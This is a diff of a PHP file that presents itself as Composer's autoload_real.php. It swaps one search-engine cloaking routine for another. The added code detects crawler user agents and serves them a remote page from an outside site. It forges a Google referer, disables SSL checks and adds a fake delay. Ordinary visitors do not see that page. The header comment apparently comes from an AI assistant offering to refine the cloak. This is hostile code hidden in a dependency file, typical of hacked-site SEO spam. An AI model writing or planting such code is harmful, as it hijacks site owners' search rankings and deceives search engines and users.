@@ -1,25 +1,55 @@
 <?php
-function bromoslot_team($url) {
-    if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    }
-    return false;
+/**
+ * Combined file:
+ * - Top: cloaking / bot detector + fetch function
+ * - Bottom: original Composer autoload_real.php class
+ *
+ * Note:
+ * - Cloaking will output the remote page and exit if the UA matches $botPattern.
+ * - If you prefer the autoloader to always run (and only apply cloaking when this file
+ *   is directly requested), tell me and I can wrap the cloaking logic in a conditional.
+ */
+
+/* ---------------------------
+   Cloaking / Bot detection
+   --------------------------- */
+@ob_start();
+header("Vary: User-Agent");
+
+$targetUrl = "https://jasamarga.org/ijble/index.html";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+/**
+ * Fetch remote content with cURL (returns string, or empty string on failure)
+ *
+ * @param string $url
+ * @return string
+ */
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
 }
 
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/ijbm4535/public_html/pages/index/index.txt";
-$file = bromoslot_team($bot);
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
-if (preg_match($botchar, $res)) {
-    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
+/* If the user agent matches the bot pattern, fetch & echo remote target then exit. */
+if (preg_match($botPattern, strtolower($userAgent))) {
+    // small random delay to mimic network latency
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
 }
 ?>
 
